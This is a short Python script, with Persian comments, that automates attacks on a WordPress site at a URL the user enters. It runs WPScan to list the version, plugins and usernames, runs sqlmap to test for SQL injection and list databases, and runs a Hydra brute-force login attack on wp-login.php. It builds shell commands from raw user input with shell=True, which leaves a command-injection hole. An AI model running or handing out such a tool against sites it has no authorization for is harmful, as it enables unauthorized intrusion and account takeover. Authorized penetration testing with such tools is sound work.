import subprocess
import os

def run_wpscan(url, api_key=None):
    commands = [
        f"wpscan --url {url} --enumerate v",  # بررسی نسخه وردپرس
        f"wpscan --url {url} --enumerate vp",  # بررسی آسیب‌پذیری‌های پلاگین‌ها
        f"wpscan --url {url} --enumerate u"  # بررسی نام کاربران وردپرس
    ]
    
    if api_key:
        commands = [cmd + f" --api-token {api_key}" for cmd in commands]
    
    for cmd in commands:
        print(f"Running: {cmd}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print(result.stdout)
        print("=" * 50)

def run_sqlmap(url):
    sqlmap_cmd = f"sqlmap -u \"{url}/?id=1\" --dbs --batch"
    print(f"Running: {sqlmap_cmd}")
    result = subprocess.run(sqlmap_cmd, shell=True, capture_output=True, text=True)
    print(result.stdout)
    print("=" * 50)

def run_hydra(url, username, password_list):
    hydra_cmd = f"hydra -l {username} -P {password_list} {url} http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^:incorrect\""
    print(f"Running: {hydra_cmd}")
    result = subprocess.run(hydra_cmd, shell=True, capture_output=True, text=True)
    print(result.stdout)
    print("=" * 50)

def main():
    url = input("Enter WordPress site URL (e.g., http://example.com): ")
    api_key = input("Enter WPScan API Key (optional): ") or None
    username = input("Enter WordPress Username to test (optional, press enter to skip): ")
    password_list = "passwords.txt"
    
    print("\n[1] Running WPScan for WordPress Security Scan...")
    run_wpscan(url, api_key)
    
    print("\n[2] Running SQL Injection Test with SQLMap...")
    run_sqlmap(url)
    
    if username:
        print("\n[3] Running Brute Force Attack with Hydra...")
        run_hydra(url, username, password_list)
    
    print("\nSecurity scan completed!")
    
if __name__ == "__main__":
    main()
